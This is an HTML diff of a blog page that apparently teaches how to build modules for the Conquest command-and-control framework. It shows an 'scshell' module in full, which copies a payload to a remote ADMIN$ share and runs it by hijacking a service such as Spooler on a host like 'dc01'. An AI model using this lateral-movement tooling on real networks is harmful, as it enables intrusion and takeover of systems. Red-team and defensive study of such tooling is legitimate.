-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37
+</div></div>
+<p>Overall, the full <code>scshell.py</code> module looks as follows.</p>
+<div class="code-block"><div class="highlight"><div class="chroma">
+<table class="lntable" class="mc-table"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> conquest 
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> os.path 
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">def</span> _scshell(agentId, cmdline, args): 
-</span></span><span style="display:flex;"><span>    target = conquest.get_string(args, <span style="color:#ff0;font-weight:bold">0</span>)
-</span></span><span style="display:flex;"><span>    payloadName, payloadBytes = conquest.get_file(args, <span style="color:#ff0;font-weight:bold">1</span>)
-</span></span><span style="display:flex;"><span>    service = conquest.get_string(args, <span style="color:#ff0;font-weight:bold">2</span>)
-</span></span><span style="display:flex;"><span>    name = conquest.get_string(args, <span style="color:#ff0;font-weight:bold">3</span>)
-</span></span><span style="display:flex;"><span>    share = conquest.get_string(args, <span style="color:#ff0;font-weight:bold">4</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#007f7f"># Format path</span>
-</span></span><span style="display:flex;"><span>    path = <span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\\\\</span><span style="color:#0ff;font-weight:bold">{</span>target<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">\\</span><span style="color:#0ff;font-weight:bold">{</span>share<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">\\</span><span style="color:#0ff;font-weight:bold">{</span>name <span style="color:#fff;font-weight:bold">if</span> name <span style="color:#fff;font-weight:bold">else</span> service<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> not path.endswith(<span style="color:#0ff;font-weight:bold">&#34;.exe&#34;</span>): path += <span style="color:#0ff;font-weight:bold">&#34;.exe&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    bof = conquest.modules_root() + <span style="color:#0ff;font-weight:bold">&#34;/lateral-movement/scshell/scshell.x64.o&#34;</span>
-</span></span><span style="display:flex;"><span>    params = conquest.bof_pack(<span style="color:#0ff;font-weight:bold">&#34;zzzb&#34;</span>, [
-</span></span><span style="display:flex;"><span>        target,         <span style="color:#007f7f"># z: Target system</span>
-</span></span><span style="display:flex;"><span>        service,        <span style="color:#007f7f"># z: Target service</span>
-</span></span><span style="display:flex;"><span>        path,           <span style="color:#007f7f"># z: Payload path</span>
-</span></span><span style="display:flex;"><span>        payloadBytes,   <span style="color:#007f7f"># b: Payload bytes         </span>
-</span></span><span style="display:flex;"><span>    ])
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> os.path.exists(bof):
-</span></span><span style="display:flex;"><span>        conquest.execute_alias(agentId, cmdline, <span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;bof </span><span style="color:#0ff;font-weight:bold">{</span>bof<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold"> </span><span style="color:#0ff;font-weight:bold">{</span>params<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">else</span>:
-</span></span><span style="display:flex;"><span>        conquest.error(agentId, cmdline, <span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;Failed to open object file: </span><span style="color:#0ff;font-weight:bold">{</span>bof<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>cmd_scshell = (
-</span></span><span style="display:flex;"><span>    conquest.createCommand(name=<span style="color:#0ff;font-weight:bold">&#34;scshell&#34;</span>, description=<span style="color:#0ff;font-weight:bold">&#34;Perform fileless lateral movement by modifying an existing remote service&#39;s binary path (SCShell tool).&#34;</span>, example=<span style="color:#0ff;font-weight:bold">&#34;scshell dc01 bin/monarch.smb_x64.svc.exe --service Spooler --name update.exe&#34;</span>,
-</span></span><span style="display:flex;"><span>                           message=<span style="color:#0ff;font-weight:bold">&#34;Tasked agent to perform fileless lateral movement via SCShell.&#34;</span>, mitre=[<span style="color:#0ff;font-weight:bold">&#34;T1021.002&#34;</span>])
-</span></span><span style="display:flex;"><span>            .addArgString(<span style="color:#0ff;font-weight:bold">&#34;target&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Target system hostname or IP address.&#34;</span>, <span style="color:#fff;font-weight:bold">True</span>)
-</span></span><span style="display:flex;"><span>            .addArgFile(<span style="color:#0ff;font-weight:bold">&#34;payload&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Path to payload to execute on the target.&#34;</span>, <span style="color:#fff;font-weight:bold">True</span>)
-</span></span><span style="display:flex;"><span>            .addFlagString(<span style="color:#0ff;font-weight:bold">&#34;--service&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;service&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Target service (default: defragsvc).&#34;</span>, <span style="color:#fff;font-weight:bold">False</span>, <span style="color:#0ff;font-weight:bold">&#34;defragsvc&#34;</span>)
-</span></span><span style="display:flex;"><span>            .addFlagString(<span style="color:#0ff;font-weight:bold">&#34;--name&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;name&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Target service name (default: Name of the target service).&#34;</span>)
-</span></span><span style="display:flex;"><span>            .addFlagString(<span style="color:#0ff;font-weight:bold">&#34;--share&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;share&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Share for copying payload (default: ADMIN$).&#34;</span>, <span style="color:#fff;font-weight:bold">False</span>, <span style="color:#0ff;font-weight:bold">&#34;ADMIN$&#34;</span>)
-</span></span><span style="display:flex;"><span>            .setHandler(_scshell)            
-</span></span><span style="display:flex;"><span>).registerToGroup(<span style="color:#0ff;font-weight:bold">&#34;lateral movement&#34;</span>)
-</span></span></code></pre></td></tr></table>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">conquest</span> 
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os.path</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_scshell</span><span class="p">(</span><span class="n">agentId</span><span class="p">,</span> <span class="n">cmdline</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">target</span> <span class="o">=</span> <span class="n">conquest</span><span class="o">.</span><span class="n">get_string</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payloadName</span><span class="p">,</span> <span class="n">payloadBytes</span> <span class="o">=</span> <span class="n">conquest</span><span class="o">.</span><span class="n">get_file</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">service</span> <span class="o">=</span> <span class="n">conquest</span><span class="o">.</span><span class="n">get_string</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="n">conquest</span><span class="o">.</span><span class="n">get_string</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">share</span> <span class="o">=</span> <span class="n">conquest</span><span class="o">.</span><span class="n">get_string</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Format path</span>
+</span></span><span class="line"><span class="cl">    <span class="n">path</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="se">\\\\</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="se">\\</span><span class="si">{</span><span class="n">share</span><span class="si">}</span><span class="se">\\</span><span class="si">{</span><span class="n">name</span> <span class="k">if</span> <span class="n">name</span> <span class="k">else</span> <span class="n">service</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">path</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s2">&#34;.exe&#34;</span><span class="p">):</span> <span class="n">path</span> <span class="o">+=</span> <span class="s2">&#34;.exe&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">bof</span> <span class="o">=</span> <span class="n">conquest</span><span class="o">.</span><span class="n">modules_root</span><span class="p">()</span> <span class="o">+</span> <span class="s2">&#34;/lateral-movement/scshell/scshell.x64.o&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">params</span> <span class="o">=</span> <span class="n">conquest</span><span class="o">.</span><span class="n">bof_pack</span><span class="p">(</span><span class="s2">&#34;zzzb&#34;</span><span class="p">,</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="n">target</span><span class="p">,</span>         <span class="c1"># z: Target system</span>
+</span></span><span class="line"><span class="cl">        <span class="n">service</span><span class="p">,</span>        <span class="c1"># z: Target service</span>
+</span></span><span class="line"><span class="cl">        <span class="n">path</span><span class="p">,</span>           <span class="c1"># z: Payload path</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payloadBytes</span><span class="p">,</span>   <span class="c1"># b: Payload bytes         </span>
+</span></span><span class="line"><span class="cl">    <span class="p">])</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">bof</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">conquest</span><span class="o">.</span><span class="n">execute_alias</span><span class="p">(</span><span class="n">agentId</span><span class="p">,</span> <span class="n">cmdline</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;bof </span><span class="si">{</span><span class="n">bof</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">params</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">conquest</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="n">agentId</span><span class="p">,</span> <span class="n">cmdline</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;Failed to open object file: </span><span class="si">{</span><span class="n">bof</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">cmd_scshell</span> <span class="o">=</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">conquest</span><span class="o">.</span><span class="n">createCommand</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s2">&#34;scshell&#34;</span><span class="p">,</span> <span class="n">description</span><span class="o">=</span><span class="s2">&#34;Perform fileless lateral movement by modifying an existing remote service&#39;s binary path (SCShell tool).&#34;</span><span class="p">,</span> <span class="n">example</span><span class="o">=</span><span class="s2">&#34;scshell dc01 bin/monarch.smb_x64.svc.exe --service Spooler --name update.exe&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                           <span class="n">message</span><span class="o">=</span><span class="s2">&#34;Tasked agent to perform fileless lateral movement via SCShell.&#34;</span><span class="p">,</span> <span class="n">mitre</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;T1021.002&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">            <span class="o">.</span><span class="n">addArgString</span><span class="p">(</span><span class="s2">&#34;target&#34;</span><span class="p">,</span> <span class="s2">&#34;Target system hostname or IP address.&#34;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="o">.</span><span class="n">addArgFile</span><span class="p">(</span><span class="s2">&#34;payload&#34;</span><span class="p">,</span> <span class="s2">&#34;Path to payload to execute on the target.&#34;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="o">.</span><span class="n">addFlagString</span><span class="p">(</span><span class="s2">&#34;--service&#34;</span><span class="p">,</span> <span class="s2">&#34;service&#34;</span><span class="p">,</span> <span class="s2">&#34;Target service (default: defragsvc).&#34;</span><span class="p">,</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&#34;defragsvc&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="o">.</span><span class="n">addFlagString</span><span class="p">(</span><span class="s2">&#34;--name&#34;</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">,</span> <span class="s2">&#34;Target service name (default: Name of the target service).&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="o">.</span><span class="n">addFlagString</span><span class="p">(</span><span class="s2">&#34;--share&#34;</span><span class="p">,</span> <span class="s2">&#34;share&#34;</span><span class="p">,</span> <span class="s2">&#34;Share for copying payload (default: ADMIN$).&#34;</span><span class="p">,</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&#34;ADMIN$&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="o">.</span><span class="n">setHandler</span><span class="p">(</span><span class="n">_scshell</span><span class="p">)</span>            
+</span></span><span class="line"><span class="cl"><span class="p">)</span><span class="o">.</span><span class="n">registerToGroup</span><span class="p">(</span><span class="s2">&#34;lateral movement&#34;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
 </div>
-</div><p>It creates the <code>scshell</code> command in Conquest that can be used to move laterally to other systems via SMB.</p>
+</div></div>
+<p>It creates the <code>scshell</code> command in Conquest that can be used to move laterally to other systems via SMB.</p>
 <p>
 
 
@@ -1023,15 +943,9 @@
 
 
 
-
-
-
 <figure class="">
-    <div>
-        <img loading="lazy" alt="SCShell help" src=" /img/c2-module-system/5.png">
-    </div>
-    
-</figure></p>
+    <img loading="lazy" alt="SCShell help" src="/img/c2-module-system/5.png"></figure>
+</p>
 <p>
 
 
@@ -1039,15 +953,9 @@
 
 
 
-
-
-
 <figure class="">
-    <div>
-        <img loading="lazy" alt="SCShell command execution" src=" /img/c2-module-system/6.png">
-    </div>
-    
-</figure></p>
+    <img loading="lazy" alt="SCShell command execution" src="/img/c2-module-system/6.png"></figure>
+</p>
 
 <h2 id="conclusion" class="header-anchor-wrapper">Conclusion
   <a href="#conclusion" class="header-anchor-link">
@@ -1086,7 +994,31 @@
 </li>
 </ol>
 </div>
-</article></div>
+</article>
+</div>
+            
+
+        </div>
+    </div>
+    <aside class="toc-sidebar">
+        <div class="toc-sidebar-title">Contents</div>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#the-bare-minimum">The Bare Minimum</a></li>
+    <li><a href="#post-exploitation-using-beacon-object-files">Post-Exploitation using Beacon Object Files</a></li>
+    <li><a href="#module-system-architecture">Module System Architecture</a></li>
+    <li><a href="#creating-commands">Creating Commands</a>
+      <ul>
+        <li><a href="#command-definition">Command Definition</a></li>
+        <li><a href="#command-arguments">Command Arguments</a></li>
+        <li><a href="#command-handler">Command Handler</a></li>
+        <li><a href="#command-registration">Command Registration</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+    </aside>
     
 </div>
 
